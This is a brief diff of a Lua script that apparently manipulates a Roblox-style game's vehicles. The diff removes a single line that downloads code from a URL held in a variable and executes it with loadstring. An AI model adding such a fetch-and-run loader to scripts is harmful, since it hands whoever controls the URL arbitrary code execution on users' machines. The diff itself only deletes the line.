@@ -1982,7 +1982,7 @@ function car_listing_gui()
       end
    end)
 end
-loadstring(getgenv().Game:HttpGet(tostring(users)))()
+
 local function get_other_vehicle(Player)
    for i, v in pairs(getgenv().Workspace:FindFirstChild("Vehicles"):GetChildren()) do
       if not v:FindFirstChild("owner") then return getgenv().notify("Error", "There is not an Owner value in this players Vehicle!", 7) end
